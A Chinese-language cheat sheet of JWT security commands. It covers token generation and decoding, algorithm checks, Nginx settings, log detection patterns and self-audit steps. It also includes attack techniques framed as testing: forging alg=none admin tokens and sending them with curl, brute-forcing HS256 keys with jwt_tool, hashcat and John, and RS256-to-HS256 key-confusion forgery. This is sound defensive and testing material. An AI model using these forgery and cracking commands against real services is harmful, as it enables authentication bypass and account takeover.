# Cybersecurity JWT 安全命令

> **符号约定**:`< >` 必填参数 | `[ ]` 可选参数

---

## JWT 生成与解析

**基本写法:生成 HS256 Token**
`python3 -c "import jwt; print(jwt.encode({'<字段>':'<值>'}, '<密钥>', algorithm='HS256'))"`
```bash
# 生成 HS256 算法 JWT Token
python3 -c "import jwt; print(jwt.encode({'user':'admin','exp':1893456000}, 'secretkey', algorithm='HS256'))"
```

**基本写法:解析 JWT Token**
`python3 -c "import jwt; print(jwt.decode('<Token>', '<密钥>', algorithms=['HS256']))"`
```bash
# 解析并验证 JWT Token
python3 -c "import jwt; print(jwt.decode('eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature', 'secretkey', algorithms=['HS256']))"
```

**基本写法:无验证解析 Token**
`python3 -c "import jwt; print(jwt.decode('<Token>', options={'verify_signature': False}))"`
```bash
# 不验证签名直接解析 Token(仅用于调试)
python3 -c "import jwt; print(jwt.decode('eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature', options={'verify_signature': False}))"
```

**基本写法:使用 jq 解析 Header/Payload**
`echo "<Token>" | cut -d. -f2 | base64 -d 2>/dev/null`
```bash
# 手动解码 JWT Payload 部分
echo "eyJ1c2VyIjoiYWRtaW4ifQ" | base64 -d 2>/dev/null
```

**基本写法:使用 jwt-cli 工具**
`jwt decode <Token>`
```bash
# 使用 jwt-cli 命令行工具解码
jwt decode eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature
```

---

## JWT 算法检测

**基本写法:查看 Token Header 算法**
`echo "<Token>" | cut -d. -f1 | base64 -d 2>/dev/null`
```bash
# 查看 JWT 使用的签名算法
echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d 2>/dev/null
```

**基本写法:Python 提取算法**
`python3 -c "import jwt; print(jwt.get_unverified_header('<Token>'))"`
```bash
# 提取 JWT Header 不验证签名
python3 -c "import jwt; print(jwt.get_unverified_header('eyJhbGciOiJIUzI1NiJ9.payload.sig'))"
```

**基本写法:检测 none 算法漏洞**
`python3 -c "import jwt; t=jwt.encode({'user':'admin'}, '', algorithm='none'); print(t)"`
```bash
# 生成 alg=none 的 Token 检测目标是否接受
python3 -c "import jwt; t=jwt.encode({'user':'admin'}, '', algorithm='none'); print(t)"
```

**基本写法:测试 none 算法绕过**
`curl -H "Authorization: Bearer <Token>" <URL>`
```bash
# 使用 none 算法 Token 测试绕过
curl -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ." https://example.com/api
```

---

## JWT 弱密钥检测

**基本写法:使用 jwt_tool 爆破密钥**
`python3 jwt_tool.py <Token> -C -d <字典>`
```bash
# 使用字典爆破 HS256 签名密钥
python3 jwt_tool.py eyJhbGciOiJIUzI1NiJ9.payload.sig -C -d passwords.txt
```

**基本写法:使用 hashcat 爆破**
`hashcat -m 16500 <Token> <字典>`
```bash
# 使用 hashcat 模式 16500 爆破 JWT 密钥
hashcat -m 16500 eyJhbGciOiJIUzI1NiJ9.payload.sig rockyou.txt
```

**基本写法:使用 john 爆破**
`python3 jwt2john.py <Token> > <hash文件>; john <hash文件> --wordlist=<字典>`
```bash
# 使用 John the Ripper 爆破 JWT
python3 jwt2john.py eyJhbGciOiJIUzI1NiJ9.payload.sig > jwt.hash
john jwt.hash --wordlist=passwords.txt
```

**基本写法:验证弱密钥**
`python3 -c "import jwt; print(jwt.decode('<Token>', 'secret', algorithms=['HS256']))"`
```bash
# 测试常见弱密钥 secret/123456 等
python3 -c "import jwt; print(jwt.decode('eyJhbGciOiJIUzI1NiJ9.payload.sig', 'secret', algorithms=['HS256']))"
```

---

## JWT 密钥混淆攻击检测

**基本写法:RS256 公钥提取**
`openssl x509 -pubkey -noout -in <证书> > <公钥文件>`
```bash
# 从证书提取公钥用于算法混淆检测
openssl x509 -pubkey -noout -in cert.pem > public.pem
```

**基本写法:使用 jwt_tool 测试混淆**
`python3 jwt_tool.py <Token> -X k -pk <公钥文件>`
```bash
# 使用公钥作为 HS256 密钥构造混淆 Token
python3 jwt_tool.py eyJhbGciOiJSUzI1NiJ9.payload.sig -X k -pk public.pem
```

**基本写法:构造 RS256 转 HS256 攻击**
`python3 -c "import jwt; print(jwt.encode({'user':'admin'}, open('public.pem').read(), algorithm='HS256'))"`
```bash
# 使用公钥作为 HMAC 密钥构造 Token
python3 -c "import jwt; print(jwt.encode({'user':'admin'}, open('public.pem').read(), algorithm='HS256'))"
```

**基本写法:验证目标是否受影响**
`curl -H "Authorization: Bearer <构造Token>" <URL>`
```bash
# 使用混淆 Token 测试目标是否接受
curl -H "Authorization: Bearer <混淆Token>" https://example.com/api
```

---

## JWT 声明校验

**基本写法:校验 exp 过期时间**
`python3 -c "import jwt; print(jwt.decode('<Token>', '<密钥>', algorithms=['HS256']))"`
```bash
# 默认会校验 exp 字段
python3 -c "import jwt; print(jwt.decode('eyJ...', 'secret', algorithms=['HS256']))"
```

**基本写法:忽略过期校验检测**
`python3 -c "import jwt; print(jwt.decode('<Token>', '<密钥>', options={'verify_exp': False}))"`
```bash
# 测试目标是否校验 exp
python3 -c "import jwt; print(jwt.decode('eyJ...', 'secret', algorithms=['HS256'], options={'verify_exp': False}))"
```

**基本写法:校验签发者 iss**
`python3 -c "import jwt; print(jwt.decode('<Token>', '<密钥>', issuer='<签发者>', algorithms=['HS256']))"`
```bash
# 校验 JWT 签发者字段
python3 -c "import jwt; print(jwt.decode('eyJ...', 'secret', issuer='auth.example.com', algorithms=['HS256']))"
```

**基本写法:校验受众 aud**
`python3 -c "import jwt; print(jwt.decode('<Token>', '<密钥>', audience='<受众>', algorithms=['HS256']))"`
```bash
# 校验 JWT 受众字段
python3 -c "import jwt; print(jwt.decode('eyJ...', 'secret', audience='api.example.com', algorithms=['HS256']))"
```

---

## JWT 安全生成

**基本写法:生成带过期时间的 Token**
`python3 -c "import jwt, time; print(jwt.encode({'user':'admin','exp':int(time.time())+3600}, 'secret', algorithm='HS256'))"`
```bash
# 生成有效期 1 小时的 Token
python3 -c "import jwt, time; print(jwt.encode({'user':'admin','exp':int(time.time())+3600}, 'secret', algorithm='HS256'))"
```

**基本写法:生成 RS256 Token**
`python3 -c "import jwt; print(jwt.encode({'user':'admin'}, open('private.pem').read(), algorithm='RS256'))"`
```bash
# 使用 RSA 私钥生成 Token
python3 -c "import jwt; print(jwt.encode({'user':'admin'}, open('private.pem').read(), algorithm='RS256'))"
```

**基本写法:生成强随机密钥**
`openssl rand -base64 48`
```bash
# 生成 HS256 使用的强随机密钥
openssl rand -base64 48
```

**基本写法:生成 jti 唯一标识**
`python3 -c "import jwt, uuid; print(jwt.encode({'jti':str(uuid.uuid4())}, 'secret', algorithm='HS256'))"`
```bash
# 生成带唯一标识的 Token 防重放
python3 -c "import jwt, uuid; print(jwt.encode({'jti':str(uuid.uuid4()),'user':'admin'}, 'secret', algorithm='HS256'))"
```

---

## JWT 安全配置(Nginx)

**基本写法:Nginx 校验 Authorization 头**
`if ($http_authorization !~ "^Bearer ") { return 401; }`
```bash
# Nginx 校验 Authorization 头格式
if ($http_authorization !~ "^Bearer ") {
    return 401;
}
```

**基本写法:转发 Token 到后端**
`proxy_set_header Authorization $http_authorization;`
```bash
# 反向代理转发 Authorization 头
proxy_set_header Authorization $http_authorization;
```

**基本写法:限制 Token 长度**
`client_header_buffer_size <大小>; large_client_header_buffers <数量> <大小>;`
```bash
# 限制请求头大小防止超大 Token
client_header_buffer_size 4k;
large_client_header_buffers 4 8k;
```

**基本写法:使用 auth_request 校验**
`auth_request /auth;`
```bash
# 使用子请求校验 JWT
location /api {
    auth_request /auth;
}
location = /auth {
    proxy_pass http://auth_service/verify;
}
```

---

## JWT 审计与监控

**基本写法:检索日志中 JWT 使用**
`grep -oE "eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*" <日志>`
```bash
# 从日志中提取所有 JWT Token
grep -oE "eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*" /var/log/nginx/access.log
```

**基本写法:统计 Token 使用频率**
`grep -oE "eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+" <日志> | sort | uniq -c | sort -rn`
```bash
# 统计各 Token 使用频率检测异常
grep -oE "eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+" /var/log/nginx/access.log | sort | uniq -c | sort -rn | head
```

**基本写法:检测 none 算法攻击**
`grep -i "eyJhbGciOiJub25lIn0\|eyJhbGciOiJub25lI" <日志>`
```bash
# 检测使用 none 算法的攻击 Token
grep -i "eyJhbGciOiJub25lIn0\|eyJhbGciOiJub25lI" /var/log/nginx/access.log
```

**基本写法:监控 Token 异常使用**
`tail -f <日志> | grep -i "bearer\|jwt"`
```bash
# 实时监控 JWT 相关请求
tail -f /var/log/nginx/access.log | grep -i "bearer\|jwt\|eyJ"
```

---

## JWT 安全自检

**基本写法:检查密钥强度**
`echo -n "<密钥>" | wc -c`
```bash
# 检查 JWT 签名密钥长度是否足够(建议 32 字节以上)
echo -n "secretkey" | wc -c
```

**基本写法:验证是否使用强算法**
`echo "<Token>" | cut -d. -f1 | base64 -d 2>/dev/null | grep -i "alg"`
```bash
# 检查 Token 是否使用 HS256/RS256 而非 none
echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d 2>/dev/null
```

**基本写法:检查代码是否校验算法**
`grep -rn "algorithms=\[" <项目目录>`
```bash
# 检查代码是否显式指定允许的算法
grep -rn "algorithms=\[" src/
```

**基本写法:批量验证 Token 配置**
`python3 -c "import jwt; h=jwt.get_unverified_header('<Token>'); print(h)"`
```bash
# 批量检查 Token 配置
python3 -c "import jwt; h=jwt.get_unverified_header('eyJ...'); print('算法:', h.get('alg')); print('类型:', h.get('typ'))"
```
